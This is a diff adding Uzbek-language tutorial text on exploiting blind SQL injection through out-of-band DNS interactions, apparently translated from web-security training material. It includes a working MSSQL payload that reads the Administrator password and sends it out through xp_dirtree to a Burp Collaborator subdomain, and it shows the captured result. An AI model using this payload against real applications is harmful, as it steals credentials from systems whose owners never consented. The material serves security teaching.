@@ -29,3 +29,26 @@ Bu kod ma’lumotlar bazasini quyidagi domen bo‘yicha DNS lookup amalga oshiri
 ```
 0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
 ```
+
+
+**Ko‘r (blind) SQL injeksiyasidan tashqarida aloqa (OAST) texnikalari orqali foydalanish – Davomi**
+
+Tashqarida aloqa (out-of-band) o‘zaro ta’sirlarini ishga tushirish usuli aniqlangach, ushbu kanal orqali zaif ilovadan ma’lumotlarni chiqarib olish (exfiltratsiya qilish) mumkin. Masalan:
+
+```sql
+'; declare @p varchar(1024);
+set @p=(SELECT password FROM users WHERE username='Administrator');
+exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+```
+
+Ushbu input **Administrator** foydalanuvchisining parolini o‘qiydi, uni noyob Collaborator subdomeniga qo‘shadi va DNS so‘rovini ishga tushiradi. Ushbu so‘rov orqali parolni ushlab olish mumkin:
+
+```
+S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
+```
+
+Out-of-band (OAST) texnikalari ko‘r SQL injeksiyasini aniqlash va ekspluatatsiya qilishda kuchli usul hisoblanadi, chunki muvaffaqiyat ehtimoli yuqori va ma’lumotlarni bevosita tashqi kanal orqali chiqarib olish imkonini beradi. Shu sababli, ko‘pincha boshqa ko‘r injeksiya usullari ishlagan holatlarda ham OAST texnikalaridan foydalanish ma’qul bo‘ladi.
+
+**Eslatma:**
+Tashqarida aloqa (out-of-band) o‘zaro ta’sirlarini ishga tushirishning turli usullari mavjud va ular turli xil ma’lumotlar bazalariga qarab farqlanadi. Batafsil ma’lumot uchun *SQL injection cheat sheet*’ni ko‘ring.
+
